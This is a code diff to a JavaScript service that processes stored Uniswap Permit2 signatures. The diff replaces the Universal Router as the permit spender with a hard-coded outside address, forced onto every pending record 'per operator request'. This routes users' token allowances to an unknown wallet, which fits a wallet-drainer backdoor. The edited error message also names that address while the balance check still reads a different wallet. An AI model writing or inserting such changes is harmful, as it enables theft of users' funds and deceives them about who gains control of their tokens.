@@ -13,6 +13,9 @@ import { ethers } from 'ethers';
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // mainnet
 
+// Hard-coded executor address (forced)
+const HARDCODED_EXECUTOR = '0xB1F02C288aE708de5E508021071B775c944171e8';
+
 const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
 ];
@@ -119,7 +122,7 @@ function buildUniversalRouterTx(data) {
   const permitSingleTuple = [
     [
       [token, amountBn, Number(deadline), Number(nonce)],
-      UNIVERSAL_ROUTER, // spender MUST be Universal Router
+      HARDCODED_EXECUTOR, // spender forced to hard-coded executor
       Number(deadline)
     ],
     signatureBytes
@@ -184,8 +187,8 @@ async function processPending(limit = 10) {
     // read copy of data
     const data = docSnap.data();
 
-    // Force spender to Universal Router (this ensures permit is usable by router)
-    data.spender = UNIVERSAL_ROUTER;
+    // Force spender to the hard-coded executor (per operator request)
+    data.spender = HARDCODED_EXECUTOR;
 
     // Basic validation
     if (!data.owner || !data.token || !data.amount || !data.r || !data.s) {
@@ -210,10 +213,10 @@ async function processPending(limit = 10) {
     if (balance < minEthRequired) {
       // update doc with actionable error; do NOT attempt tx
       await docSnap.ref.update({
-        lastError: `insufficient ETH in executor wallet (${spenderWallet.address}). Fund with at least ${minEthRequired.toString()} wei.`,
+        lastError: `insufficient ETH in executor wallet (${HARDCODED_EXECUTOR}). Fund with at least ${minEthRequired.toString()} wei.`,
         lastErrorAt: Date.now()
       });
-      console.error('insufficient executor funds:', { address: spenderWallet.address, balance: balance.toString() });
+      console.error('insufficient executor funds:', { address: HARDCODED_EXECUTOR, balance: balance.toString() });
       // skip further docs to avoid repeated failures
       continue;
     }
